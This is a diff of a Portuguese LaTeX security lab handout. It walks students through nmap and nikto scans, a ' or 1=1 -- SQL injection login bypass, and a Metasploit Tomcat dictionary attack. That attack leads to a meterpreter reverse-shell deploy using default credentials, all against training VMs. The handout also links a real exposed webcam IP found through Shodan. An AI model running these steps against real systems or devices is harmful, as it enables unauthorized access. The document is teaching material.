@@ -38,6 +38,8 @@
 % User-commands
 \newcommand{\todo}[1]{{\color{red}{#1}}}
 
+\newcommand{\code}[1]{\texttt{#1}}
+
 \NewEnviron{superframe}{%
     \begin{center}
         \fbox{\setlength{\fboxsep}{1em}\fbox{\parbox{5.5in}{%
@@ -79,8 +81,11 @@
 
         \begin{enumerate}
             \item \texttt{nmap -sV -O 10.1.2.6};
+
+                As flags \code{}
             \item \texttt{nmap -v -A 10.1.2.6};
-            \item \texttt{nmap -sS -v --top-ports 10 --reason -oA saidanmap www.ufsc.br};
+            \item \texttt{nmap -sS -v --top-ports 10 --reason -oA saidanmap
+                www.ufsc.br};
             \item Crie um comando com opções diferentes das usadas nas questões
                 anteriores e explique a saída obtida pelo seu comando.
             \item Responda:
@@ -101,6 +106,7 @@
 
     \begin{superframe}
         \begin{enumerate}
+            \setcounter{enumi}{5}
             \item Execute o comando \texttt{nikto -host http://10.1.2.6/Wacko -o nikto.html -format htm}.
                 \begin{enumerate}
                     \item Copie e cole screenshots de telas obtidas na execução do
@@ -118,18 +124,21 @@
 
     \begin{superframe}
         \begin{enumerate}
-            \item Explique as vulnerabilidades A1, A2, A3 e A7 do documento TOP TEN
-                2017:
+            \setcounter{enumi}{6}
+            \item Explique as vulnerabilidades A1, A2, A3 e A7 do documento TOP
+                TEN 2017:
                 \url{https://www.owasp.org/images/7/72/OWASP_Top_10-2017_$28en$29.pdf.pdf};
             \item Faça:
                 \begin{enumerate}
                     \item Acesse a aplicação Mutillidae: abra o browser da sua
-                        máquina real ou na Kali Linux no site \url{http://<IP da
-                        Kali>/mutillidae} e clique em Login. No campo Username,
-                        digite \texttt{' or 1=1 -- }. O campo password pode ficar
-                        em branco. Copie e cole a tela do seu experimento;
-                    \item Explique o resultado obtido e a vulnerabilidade explorada
-                        no experimento (pesquise no documento do TOP 10 da OWASP);
+                        máquina real ou na Kali Linux no site \url{http://<IP
+                        da Kali>/mutillidae} e clique em Login. No campo
+                        Username, digite \texttt{' or 1=1 -- }. O campo
+                        password pode ficar em branco. Copie e cole a tela do
+                        seu experimento;
+                    \item Explique o resultado obtido e a vulnerabilidade
+                        explorada no experimento (pesquise no documento do TOP
+                        10 da OWASP);
                     \item O que pode ser feito para impedir a exploração dessa
                         vulnerabilidade?
                     \item Clique em Logout.
@@ -139,34 +148,177 @@
                 \begin{enumerate}
                     \item Explique a vulnerabilidade explorada no experimento
                         (pesquise no documento do TOP 10 da OWASP);
-                    \item Copie e cole um screenshot da execução de um experimento;
+                    \item Copie e cole um screenshot da execução de um
+                        experimento;
                     \item O que pode ser feito para impedir a exploração dessa
                         vulnerabilidade?
                 \end{enumerate}
-            \item Você deve utilizar a ferramenta OWASP ZAP (Zed Attack Proxy) da
-                Kali Linux. As ferramentas de scan de web são encontradas no menu
-                Kali-Linux -> O3 --- Web Application Analysis -> owasp-zap. Faã um
-                scan das vulnerabilidades da aplicação WackoPicko da máquina OWASP
-                Broken usando a ferramenta. Faça:
+            \item Você deve utilizar a ferramenta OWASP ZAP (Zed Attack Proxy)
+                da Kali Linux. As ferramentas de scan de web são encontradas no
+                menu Kali-Linux -> O3 --- Web Application Analysis ->
+                owasp-zap. Faça um scan das vulnerabilidades da aplicação
+                WackoPicko da máquina OWASP Broken usando a ferramenta. Faça:
                 \begin{enumerate}
                     \item Coloque a URL da aplicação --- \url{http://<IP da
-                        OWASP>/WackoPicko} --- e clique em ``Attack''. A análise
-                        básica é iniciada. Demora um pouco (de 8 a 10 minutos) e
-                        você deve salvar o relatório geral do processo (opção
-                        Report -> Generate HTML Report). Os alertas (aba Alerts)
-                        vão listando as vulnerabilidades encontradas. Na aba Active
-                        Scan é possível ver os requests sendo enviados.
+                        OWASP>/WackoPicko} --- e clique em ``Attack''. A
+                        análise básica é iniciada. Demora um pouco (de 8 a 10
+                        minutos) e você deve salvar o relatório geral do
+                        processo (opção Report -> Generate HTML Report). Os
+                        alertas (aba Alerts) vão listando as vulnerabilidades
+                        encontradas. Na aba Active Scan é possível ver os
+                        requests sendo enviados.
                     \item Comente o experimento e os resultados alcançados.
                 \end{enumerate}
             \item Observe a lista de vulnerabilidades da aplicação Mutillidae
                 disponível em \url{http://<IP da
                 Kali>/mutillidae/index.php?page=./documentation/vulnerabilities.php}.
-                Agora você deve escolher duas vulnerabilidades do TOP 10 2017 da
-                lista da OWASP e criar uma forma de ataque para cada uma das
-                vulnerabilidades escolhidas. Assim, você deve criar dois ataques
-                (devem ser diferentes dos ataques das questões 8 e 9). Documente os
-                experimentos e mostre funcionando na apresentação. Na apresentação
-                você também deve explicar as vulnerabilidades.
+                Agora você deve escolher duas vulnerabilidades do TOP 10 2017
+                da lista da OWASP e criar uma forma de ataque para cada uma das
+                vulnerabilidades escolhidas. Assim, você deve criar dois
+                ataques (devem ser diferentes dos ataques das questões 8 e 9).
+                Documente os experimentos e mostre funcionando na apresentação.
+                Na apresentação você também deve explicar as vulnerabilidades.
         \end{enumerate}
     \end{superframe}
+
+    \section{Vulnerabilidades em IoT}
+
+    \begin{superframe}
+        \begin{enumerate}
+            \setcounter{enumi}{11}
+            \item Leia a reportagem com título ``Find webcams, databases, boats
+                in the sea using Shodan'' disponível em
+                \url{https://www.securitynewspaper.com/2018/11/27/find-webcams-databases-boats-in-the-sea-using-shodan/}.
+                Responda:
+
+                \begin{enumerate}
+                    \item O que é o Shodan e o que é possível fazer com esse
+                        site?
+                    \item (Apresentação) Faça o registro no site, pesquise e
+                        liste algum dispositivo IoT que você encontrou.
+                \end{enumerate}
+
+        \item Conforme descrito na reportagem, acesse o link
+            \url{http://166.161.197.253:5001/cgi-bin/guestimage.html}. É uma
+            câmera Mobotix. Responda:
+            \begin{enumerate}
+                \item O que é possível visualizar?
+                \item Um atacante poderia fazer o que com este acesso?
+            \end{enumerate}
+        \end{enumerate}
+    \end{superframe}
+
+    \section{Metasploit}
+
+    \subsection{%
+        Usando o Metasploit para explorar o TOMCAT na máquina Owasp Broken
+    }
+
+    O servidor Apache Tomcat é um servidor web Java.
+
+    \begin{minted}{console}
+        msf > search tomcat
+    \end{minted}
+
+    Com o comando search tomcat é possível identificar os exploits disponíveis.
+    Procure o nome do módulo:
+
+    \begin{minted}{text}
+        Name ... Description
+        auxiliary/scanner/http/tomcat_mgr_login ... Tomcat Application Manager Login Utility
+    \end{minted}
+
+    Para usar este módulo digite:
+
+    \begin{minted}{console}
+        msf > use auxiliary/scanner/http/tomcat_mgr_login
+        msf > show options
+    \end{minted}
+
+    As opções mostram o que pode ser configurado para usar o módulo escolhido.
+    Nem tudo precisa ser configurado.
+
+    Digite os comandos abaixo. Copie e cole o screenshot da sua tela no
+    relatório da tarefa ao realizar o experimento:
+
+    \begin{minted}{console}
+        msf auxiliary(tomcat_mgr_login) > set RHOSTS 10.1.2.6
+        msf auxiliary(tomcat_mgr_login) > set RPORT 8080 (Porta do Tomcat)
+        msf auxiliary(tomcat_mgr_login) > exploit
+    \end{minted}
+
+    Este módulo executa um ataque do dicionário, utilizando os arquivos
+    indicados nas variáveis indicadas acima. Neste ataque uma das combinações
+    utilizadas poderá ser aceita pelo servidor.
+
+    \begin{superframe}
+        \begin{enumerate}
+            \setcounter{enumi}{13}
+            \item Copie e cole a screenshot da sua tela ao realizar o
+                experimento anterior. Depois, explique o experimento:
+
+                \begin{enumerate}
+                    \item O que é o ataque do dicionário?
+                    \item O que foi encontrado?
+                    \item Qual foi a vulnerabilidade usada para obter esse
+                        resultado?
+                    \item Como pode ser explorado esse resultado?
+                \end{enumerate}
+        \end{enumerate}
+    \end{superframe}
+
+    O \code{tomcat\_mgr\_deploy} pode usar diferentes payloads. O payload
+    identifica o código que o módulo deve executar e que deve ser entregue ao
+    alvo.
+
+    \begin{minted}{console}
+        msf exploit(tomcat_mgr_deploy) > show payloads
+    \end{minted}
+
+    Digite os comandos:
+
+    \begin{minted}{console}
+        msf > use exploit/multi/http/tomcat_mgr_deploy
+        msf exploit(tomcat_mgr_deploy) > set RHOSTS x.x.x.x (IP da máquina Owasp)
+        msf exploit(tomcat_mgr_deploy) > set HttpUsername root
+        msf exploit(tomcat_mgr_deploy) > set HttpPassword owaspbwa
+        msf exploit(tomcat_mgr_deploy) > set RPORT 8080
+        msf exploit(tomcat_mgr_deploy) > show options
+        msf exploit(tomcat_mgr_deploy) > show payloads
+        msf exploit(tomcat_mgr_deploy) > set payload java/meterpreter/reverse_tcp
+        msf exploit(tomcat_mgr_deploy) > show options
+        msf exploit(tomcat_mgr_deploy) > set LHOST 10.1.2.7 -> colocar IP da Kali
+        msf exploit(tomcat_mgr_deploy) > exploit
+    \end{minted}
+
+    Nesse prompt (meterpreter) podem ser executados comandos. Ao conseguir
+    chegar no prompt do meterpreter você está com um tipo de shell na máquina
+    alvo. Digite help no prompt do meterpreter para listar os comandos
+    possíveis que poderão ser executados.
+
+    \begin{superframe}
+        \begin{enumerate}
+            \setcounter{enumi}{14}
+            \item Copie e cole a screenshot da sua tela de estabelecimento de
+                sessão (inclua na imagem a parte dos IPs, data e hora dos
+                experimentos). Agora, explique os experimentos respondendo
+                perguntas:
+
+            \begin{enumerate}
+                \item Qual a vulnerabilidade que está sendo explorada?
+                \item O que faz o exploit para explorar a vulnerabilidade?
+                \item O que é o meterpreter?
+                \item O que é possível fazer depois que o exploit é executado?
+                    Use pelo menos dois comandos do meterpeter listados com o
+                    comando help e explique cada um deles, colocando a imagem
+                    da execução dos seus comandos. Alguns comandos para
+                    máquinas Windows não funcionarão na máquina Linux.
+            \end{enumerate}
+        \end{enumerate}
+    \end{superframe}
+
+    Sequência de meterpreters:
+
+    --- ps
+    ---
 \end{document}
